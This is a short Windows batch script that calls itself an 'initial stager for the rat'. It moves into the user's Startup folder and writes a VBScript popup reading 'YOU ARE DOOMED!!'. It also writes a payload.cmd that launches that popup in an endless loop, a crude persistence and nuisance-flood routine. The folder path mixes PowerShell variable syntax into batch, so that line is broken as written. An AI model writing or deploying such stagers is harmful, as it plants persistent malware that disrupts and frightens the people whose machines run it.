@echo off

@rem initial stager for the rat

cd C:\Users\$env:username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

(echo MsgBox "YOU ARE DOOMED!!" & VbCrLf & "YOU ARE DOOMED!!", vbExclamation+vbOkOnly+vbDefaultButton0, "Tittle") > popup.vbs

(
    echo @echo off
    echo :loop
    echo start /min cmd /c "popup.vbs"
    echo goto loop
)>payload.cmd

